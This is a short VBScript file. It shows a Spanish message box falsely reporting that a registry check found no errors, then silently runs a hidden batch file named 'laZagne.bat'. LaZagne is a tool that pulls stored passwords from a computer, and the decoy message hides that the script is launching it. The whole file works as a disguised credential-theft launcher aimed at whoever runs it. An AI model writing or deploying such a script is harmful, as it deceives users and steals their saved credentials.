MsgBox ("No se encontro ningun error en el registro. [PUSE ACEPTAR PARA FINALIZAR]")
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "laZagne.bat" & Chr(34), 0
Set WshShell = Nothing